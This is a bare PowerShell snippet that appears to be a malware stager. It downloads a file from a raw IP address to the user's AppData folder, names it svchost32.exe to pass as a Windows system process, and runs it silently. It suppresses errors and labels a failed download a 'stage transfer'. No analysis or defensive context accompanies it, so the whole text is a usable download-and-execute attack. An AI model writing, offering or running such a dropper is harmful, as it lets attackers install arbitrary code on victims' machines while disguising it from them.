
try { $RemoteUrl = "http://203.0.113.18:8080/update.dat"; $DropPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath); Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue; Start-Sleep -Seconds 19 } catch { Write-Warning "Stage transfer failed" }
